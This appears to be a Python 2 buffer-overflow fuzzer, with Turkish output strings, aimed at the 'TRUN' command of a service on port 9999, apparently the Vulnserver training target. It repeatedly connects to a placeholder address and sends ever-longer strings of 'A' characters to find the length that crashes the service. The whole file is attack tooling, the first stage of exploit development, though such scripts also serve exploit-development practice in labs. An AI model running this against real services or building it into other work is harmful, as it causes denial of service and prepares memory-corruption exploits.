#!/usr/bin/python
import socket

string = 'A'
i = 200

while len(string) < 10000:
	print "gonderilen uzunluk: ", len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(("IPADRESI",9999))
	s.recv(1024)
	s.send("TRUN ." + string)
	s.recv(1024)
	string = 'A' * i
	i += 200
	s.close()